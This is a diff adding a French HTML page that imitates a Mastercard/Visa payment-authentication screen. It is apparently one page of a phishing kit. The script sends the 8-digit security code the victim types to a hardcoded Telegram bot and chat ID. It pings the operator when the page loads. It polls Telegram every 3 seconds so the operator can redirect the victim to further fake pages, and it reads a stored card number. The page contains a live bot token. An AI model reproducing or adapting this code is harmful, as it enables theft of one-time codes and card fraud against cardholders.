@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+</head>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        min-height: 100vh;
+        padding-top: 0px;
+    }
+
+    .container {
+        background: white;
+        margin: 0;
+        padding: 10px 50px;
+        border-radius: 0px;
+        text-align: center;
+        width: 100%;
+        max-width: 350px;
+    }
+
+    h2 {
+        color: white;
+        font-size: 20px;
+        margin-bottom: 5px;
+    }
+
+    .logos {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 5px;
+    }
+
+    .logos img {
+        height: 34px;
+        padding: 0px;
+    }
+
+    #visa {
+        height: 48px;
+    }
+
+    .auth-box {
+        background: #b66009;
+        color: white;
+        border-radius: 0px;
+        margin: 0px;
+        position: relative;
+        font-weight: bold;
+        font-size: 15px;
+        margin-left: -50px;
+        margin-right: -50px;
+        padding: 10px 10px;
+    }
+
+    .auth-box img {
+        display: block;
+        margin: 15px auto 0;
+        width: 35px;
+    }
+
+    .info {
+        background: #2b6cb0;
+        padding: 5px;
+        border-radius: 0px;
+        margin-top: 0;
+        font-size: 10px;
+        color: white;
+    }
+
+    .details {
+        text-align: center;
+        margin: 10px 0;
+        font-size: 12px;
+    }
+
+    .details p {
+        margin: 1px 0;
+    }
+
+    .instructions {
+        text-align: left;
+        padding: 0;
+        font-size: 15px;
+        list-style: none;
+        counter-reset: step-counter;
+    }
+
+    .instructions li {
+        margin: 2px 0;
+        position: relative;
+        padding-left: 40px;
+    }
+
+    .instructions li::before {
+        content: counter(step-counter);
+        counter-increment: step-counter;
+        position: absolute;
+        left: 0;
+        top: 50%;
+        transform: translateY(-50%);
+        background: #000;
+        color: white;
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-weight: bold;
+    }
+
+    .code-box {
+        margin-top: 20px;
+        text-align: center;
+    }
+
+    .code-box input {
+        width: 80%;
+        padding: 10px;
+        font-size: 16px;
+        text-align: center;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+    }
+
+    .code-box button {
+        margin-top: 10px;
+        background-color: #001;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+    }
+
+    .countdown {
+        margin-top: 10px;
+        font-size: 16px;
+        color: red;
+    }
+
+    .loading-gif {
+        display: none;
+        margin-top: 20px;
+    }
+
+    #loading-gif img {
+        width: 125px;
+        height: auto;
+    }
+</style>
+
+<body>
+    <div class="container">
+        <div class="logos">
+            <img src="https://files.catbox.moe/fxt04z.jpg" alt="Matsercard">
+            <img src="https://files.catbox.moe/2h7sdc.png" id="visa" alt="Visa">
+        </div>
+        <div class="auth-box">
+            <h2>En attente d'authentification</h2>
+            <p>Afin de valider votre paiement, nous avons besoin d'une
+                validation supplémentaire de votre part</p>
+            <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Chargement...">
+        </div>
+        <div class="details">
+            <p><strong>Montant :</strong> 1000€</p>
+            <p><strong>Date :</strong> <span id="date"></span></p>
+            <p><strong>N° de carte :</strong> <span id="card-display">xxxxxxxxxxxxXXXX</span></p>
+        </div>
+        <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/l15why.gif" height="123px"
+            width="220px" data-component="video">
+
+        <ol class="instructions">
+            <li>Vous allez recevoir une notification sur votre appareil de confiance</li>
+            <li>Appuyez sur cette notification pour valider l'opération</li>
+            <li>Revenez ensuite sur cette page et vérifiez que votre paiement a été validé</li>
+        </ol>
+        <div class="code-box">
+            <h4>Étape 1/2 : Saisissez le code de sécurité reçu sur votre téléphone</h4>
+            <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/ccqgjj.png" height="100px"
+                width="100px            " data-component="video">
+            <input type="text" id="securityCode" maxlength="8" placeholder="Code de sécurité (8 chiffres)">
+            <p id="validation-error" style="display: none; color: red; font-size: 0.9em; margin-top: 5px;">Code invalide
+            </p>
+            <div class="countdown" id="countdown">05:00</div>
+            <button onclick="sendCodeToTelegram()">Continuer</button>
+            <div id="loading-gif" class="loading-gif">
+                <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1263.gif" alt="Chargement...">
+                <p>Traitement en cours...</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        // Mise à jour du date à chaque chargement de page
+        function updateDate() {
+            const options = { timeZone: 'Europe/Paris', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
+            const now = new Date().toLocaleString('fr-FR', options);
+            const dateElement = document.getElementById('date');
+            if (dateElement) {
+                dateElement.textContent = now;
+            }
+        }
+
+        // Compte à rebours
+        function startCountdown(durationInSeconds, display) {
+            let timer = durationInSeconds, minutes, seconds;
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "Expiré"; // après expiration
+                }
+            }, 1000);
+        }
+
+        // Envoi du code à Telegram
+        function sendCodeToTelegram() {
+            const code = document.getElementById('securityCode').value;
+
+            // Vérification de la validité du code
+            if (code.length === 8 && /^\d{8}$/.test(code)) {
+                // Affichage de l'animation de chargement
+                document.getElementById('loading-gif').style.display = 'block';
+
+                const telegramBotToken = '7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8';
+                const chatId = '6669693805';
+                const message = `Code de sécurité: ${code}`;
+
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            } else {
+                // Affichage de l'erreur si le code est incorrect
+                document.getElementById('validation-error').style.display = 'block';
+            }
+        }
+
+        // Envoi d'un message initial à Telegram lors du chargement de la page
+        function sendInitialMessage() {
+            const token = "7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8";
+            const chatId = "6669693805";
+            const psd = "Checkout";
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const messageData = {
+                chat_id: chatId,
+                text: `🟠 ${psd}`,
+                reply_markup: JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "Validé", callback_data: "v:" + psd }],
+                        [{ text: "Checkout", callback_data: "e:" + psd }],
+                        [{ text: "Checkout MDP", callback_data: "o1:" + psd }],
+                        [{ text: "Expire", callback_data: "o2:" + psd }],
+                        [{ text: "Checkout Global", callback_data: "o10:" + psd }],
+                        [{ text: "incorrect", callback_data: "O7:" + psd }]
+                    ]
+                })
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(messageData)
+            }).catch(console.error);
+        }
+
+        // Récupération des mises à jour depuis Telegram
+        function getUpdates() {
+            const url = `https://api.telegram.org/bot7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8/getUpdates`;
+
+            fetch(url)
+                .then(res => res.json())
+                .then(data => {
+                    const updates = data.result;
+                    if (!updates.length) return;
+
+                    updates.forEach(update => {
+                        const query = update.callback_query;
+                        if (!query) return;
+
+                        const [type, value] = query.data.split(":");
+                        if (value === "Checkout") {
+                            if (type === "v") {
+                                window.location.href = "CheckoutValide.html";
+                            } else if (type === "e") {
+                                window.location.href = "Checkout.html";
+                            } else if (type === "o1") {
+                                window.location.href = "CheckoutMDP.html";
+                            } else if (type === "o2") {
+                                window.location.href = "CheckoutExpire.html";
+                            } else if (type === "o10") {
+                                window.location.href = "CheckoutExpire.html";
+                            } else if (type === "O7") {
+                                window.location.href = "incorrect.html";
+                            }
+                        }
+
+
+                        markUpdateAsRead(update.update_id);
+                    });
+                })
+                .catch(console.error);
+        }
+
+        // Marquer la mise à jour comme "lue"
+        function markUpdateAsRead(updateId) {
+            const url = `https://api.telegram.org/bot7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8/getUpdates?offset=${updateId + 1}`;
+            fetch(url).catch(console.error);
+        }
+
+        // Vérification des mises à jour toutes les 3 secondes
+        setInterval(getUpdates, 3000);
+
+        // Mise en place de la barre de progression
+        document.addEventListener('DOMContentLoaded', function () {
+            const progressBar = document.getElementById('progress-bar');
+
+            function updateProgress(progress) {
+                progressBar.style.width = progress + '%';
+            }
+
+            let progress = 0;
+
+            const interval = setInterval(() => {
+                progress += 100 / 30;  // Avance de 100% en 30 secondes
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                }
+
+                updateProgress(progress);
+            }, 1000);
+        });
+
+        // Chargement de toutes les fonctions à l'ouverture de la page
+        window.onload = function () {
+            updateDate(); // Mettre à jour la date
+            const countdownElement = document.getElementById('countdown');
+            if (countdownElement) {
+                startCountdown(300, countdownElement); // Commencer un compte à rebours de 5 minutes (300 secondes)
+            }
+            sendInitialMessage(); // Envoyer un message initial à Telegram
+
+            // Récupérer le numéro de la carte depuis le localStorage
+            const cardNumber = localStorage.getItem('cardNumber');
+            if (cardNumber) {
+                // Masquer les 12 premiers chiffres et afficher les 4 derniers
+                const maskedCardNumber = 'xxxxxxxxxxxx' + cardNumber.slice(-4);
+                document.getElementById('card-display').textContent = maskedCardNumber;
+            } else {
+                // Si le numéro de carte n'est pas trouvé, afficher un message d'erreur
+                document.getElementById('card-display').textContent = 'xxxxxxxxxxxxXXXX';
+            }
+        };
+    </script>
+</body>
+
+</html>
